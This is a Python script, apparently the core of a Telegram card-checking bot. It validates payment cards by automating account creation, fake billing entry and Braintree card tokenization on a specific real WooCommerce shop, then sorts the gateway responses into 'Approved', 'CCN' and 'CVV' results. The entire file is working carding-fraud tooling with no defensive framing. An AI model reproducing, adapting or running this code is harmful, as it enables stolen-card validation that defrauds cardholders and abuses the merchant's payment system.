import os,sys
import random
import telebot
import requests,random,time,string,base64
from user_agent import generate_user_agent
from colorama import Fore
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup



import random
import string
import threading
import time
		
		
def Tele(ccx):
	ccx,n,mm,yy,cvc,email,user,username = ccx.strip(),ccx.split("|")[0],ccx.split("|")[1],ccx.split("|")[2],ccx.split("|")[3],"".join(random.choice('qwertyuiopasdfghjklzxcvbnm') for b in range(7))+'@gmail.com', generate_user_agent(),''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	r=requests.session()
	headers={'User-Agent': user,}
	rrr=r.get("https://bellamodastudio.com/my-account/add-payment-method/",headers=headers)
	login=findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
	headers={'User-Agent': user,}
	data = {'username': username,'email': email,'wc_order_attribution_source_type': 'typein','wc_order_attribution_referrer': '(none)','wc_order_attribution_utm_campaign': '(none)','wc_order_attribution_utm_source': '(direct)','wc_order_attribution_utm_medium': '(none)','wc_order_attribution_utm_content': '(none)','wc_order_attribution_utm_id': '(none)','wc_order_attribution_utm_term': '(none)','wc_order_attribution_utm_source_platform': '(none)','wc_order_attribution_utm_creative_format': '(none)','wc_order_attribution_utm_marketing_tactic': '(none)','wc_order_attribution_session_entry': 'https://bellamodastudio.com/my-account/add-payment-method/','wc_order_attribution_session_start_time': '2024-10-25 18:40:42','wc_order_attribution_session_pages': '1','wc_order_attribution_session_count': '1','wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','woocommerce-register-nonce': login,'_wp_http_referer': '/my-account/add-payment-method/','register': 'Register',}
	response = r.post('https://bellamodastudio.com/my-account/add-payment-method/', headers=headers, data=data)
	headers={'User-Agent': user,}
	res = r.get('https://bellamodastudio.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	add = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', res.text).group(1)
	headers={'User-Agent': user,}
	data = {'billing_first_name': 'Tome','billing_last_name': 'Hunty','billing_company': '','billing_country': 'US','billing_address_1': '56 High St','billing_address_2': '','billing_city': 'Mold','billing_state': 'NY','billing_postcode': '10090','billing_phone': '1 253-290-6967','billing_email': email,'billing_how_found_us': 'YouTube ','billing_agree_to_terms': 'I have read & agree to shipping & guarantee terms','save_address': 'Save address','woocommerce-edit-address-nonce': add,'_wp_http_referer': '/my-account/edit-address/billing/','action': 'edit_address',}
	response = r.post(
	    'https://bellamodastudio.com/my-account/edit-address/billing/',
	    headers=headers,
	    data=data,
	)
	headers={'User-Agent': user,}
	rrr=r.get("https://bellamodastudio.com/my-account/add-payment-method/",headers=headers)
	nonce,aut=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0],rrr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
	headers = {'authority': 'payments.braintree-api.com','accept': '*/*','accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7','authorization': f'Bearer {auth}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
	json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': None,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': n,'expirationMonth': mm,'expirationYear': yy,'cvv': cvc,'billingAddress': {'postalCode': '10080','streetAddress': '56 High St',},},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
	tok = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()['data']['tokenizeCreditCard']['token']
	headers={'User-Agent': user,}
	data = {'payment_method': 'braintree_cc','braintree_cc_nonce_key': tok,'braintree_cc_device_data': '{"device_session_id":"cc9ad686107880b70b3e3c47542e5e52","fraud_merchant_id":null,"correlation_id":"1c8ad1c8-f004-4e96-98af-8dfa6083"}','braintree_cc_3ds_nonce_key': '','braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/hj23fv5n4phszjjj/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/hj23fv5n4phszjjj"},"merchantId":"hj23fv5n4phszjjj","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bella Moda Studio Inc.","clientId":"AVklEQ78Ty3IJVoOyejQlxzmKNuqUPuhM14F9V84RnPUfXtlzS8ry8HYBF3-OsPR7gXreDX0TMqyp3BM","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"infobellamodastudiocom","payeeEmail":null,"currencyIsoCode":"USD"}}','woocommerce-add-payment-method-nonce': nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1'}
	response = r.post('https://bellamodastudio.com/my-account/add-payment-method/', headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		kopi = match.group(1)
		if 'risk_threshold' in kopi:
			return "RISK: Retry this BIN later."
		elif 'You cannot add a new payment method so soon after the previous one' in kopi:
			return "Please wait for 20 seconds."
		elif 'Nice! New payment method added' in kopi or 'Payment method successfully added.' in kopi:
			return '1000: Approved'
		elif 'Duplicate card exists in the vault.' in kopi:
			return 'Approved'
		elif "avs: Gateway Rejected: avs" in kopi or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in kopi or "cvv: Gateway Rejected: cvv" in kopi:
			return '1000: Approved'
		elif "Invalid postal code" in kopi or "CVV." in kopi:
			return 'Approved (CVV)'
		elif "Card Issuer Declined CVV" in kopi:
			return 'Approved (CCN)'
		else:
			return kopi
	else:
		if 'Payment method successfully added.' in text:
			return "1000: Approved"
		elif 'risk_threshold' in text:
			return "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			return "try again"
		else:
			return 'Unknow Response'
	
		
